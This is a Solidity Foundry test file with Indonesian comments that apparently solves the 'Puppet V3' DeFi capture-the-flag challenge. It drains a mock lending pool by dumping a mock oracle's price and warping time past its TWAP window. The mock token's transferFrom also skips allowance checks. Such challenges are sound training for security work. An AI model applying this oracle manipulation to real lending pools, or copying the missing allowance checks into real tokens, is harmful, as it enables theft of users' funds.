// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK TOKEN ---
contract MockToken {
    string public name;
    mapping(address => uint256) public balanceOf;

    constructor(string memory _name) { name = _name; }

    function mint(address to, uint256 amount) public {
        balanceOf[to] += amount;
    }

    // Fix warning unused vars
    function approve(address /*spender*/, uint256 /*amount*/) public pure returns (bool) { return true; }
    
    function transfer(address to, uint256 amount) public returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Saldo kurang");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        require(balanceOf[from] >= amount, "Saldo from kurang");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

// --- 2. MOCK UNISWAP V3 POOL (ORACLE) ---
contract MockUniswapV3Pool {
    uint256 public currentPrice; 
    uint256 public lastUpdate;

    constructor() {
        currentPrice = 1 ether; 
        lastUpdate = block.timestamp;
    }

    // Fix warning unused vars
    function swap(address, bool, int256, uint160) external {
        currentPrice = 0.0001 ether; // Harga jatuh
        lastUpdate = block.timestamp;
    }

    function observe(uint32[] calldata secondsAgos) external view returns (int56[] memory tickCumulatives, uint160[] memory secondsPerLiquidityCumulativeX128s) {
        tickCumulatives = new int56[](secondsAgos.length);
        secondsPerLiquidityCumulativeX128s = new uint160[](secondsAgos.length);
        return (tickCumulatives, secondsPerLiquidityCumulativeX128s);
    }
}

// --- 3. MOCK LENDING POOL ---
contract MockPuppetV3Pool {
    MockToken public dvt;
    MockToken public weth;
    MockUniswapV3Pool public oracle;

    constructor(address _dvt, address _weth, address _oracle) {
        dvt = MockToken(_dvt);
        weth = MockToken(_weth);
        oracle = MockUniswapV3Pool(_oracle);
    }

    function borrow(uint256 borrowAmount) external {
        uint256 price = oracle.currentPrice();
        
        // Logic TWAP Simulation
        if (block.timestamp < oracle.lastUpdate() + 100) {
            price = 1 ether; 
        }

        // Deposit = (Amount * Price) * 3
        uint256 depositRequired = (borrowAmount * price) * 3 / 1 ether;

        // Ambil collateral WETH
        weth.transferFrom(msg.sender, address(this), depositRequired);

        // Kasih DVT
        dvt.transfer(msg.sender, borrowAmount);
    }
}

// --- 4. ATTACK SCRIPT ---
contract PuppetV3Challenge is Test {
    MockToken dvt;
    MockToken weth;
    MockPuppetV3Pool lendingPool;
    MockUniswapV3Pool uniswap;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        
        dvt = new MockToken("DVT");
        weth = new MockToken("WETH");
        uniswap = new MockUniswapV3Pool();
        lendingPool = new MockPuppetV3Pool(address(dvt), address(weth), address(uniswap));

        // Setup Pool
        dvt.mint(address(lendingPool), 1_000_000 ether);
        
        // Setup Attacker
        dvt.mint(attacker, 100 ether);
        // PERBAIKAN DI SINI: Kasih 1000 WETH biar cukup bayar jaminan
        weth.mint(attacker, 1000 ether); 
    }

    function test_PuppetV3_Attack() public {
        vm.startPrank(attacker);

        console.log("--- START ATTACK ---");
        
        // 1. DUMP HARGA
        uniswap.swap(address(0), true, 100 ether, 0);
        
        // 2. TIME TRAVEL (Biar TWAP Oracle update)
        vm.warp(block.timestamp + 110);
        
        // 3. PINJAM
        weth.approve(address(lendingPool), 1000 ether); 
        
        uint256 poolBalance = dvt.balanceOf(address(lendingPool));
        lendingPool.borrow(poolBalance);

        // VALIDASI
        console.log("Saldo DVT Attacker:", dvt.balanceOf(attacker));
        assertGe(dvt.balanceOf(attacker), 1_000_000 ether, "Misi Gagal: DVT belum dikuras!");

        vm.stopPrank();
    }
}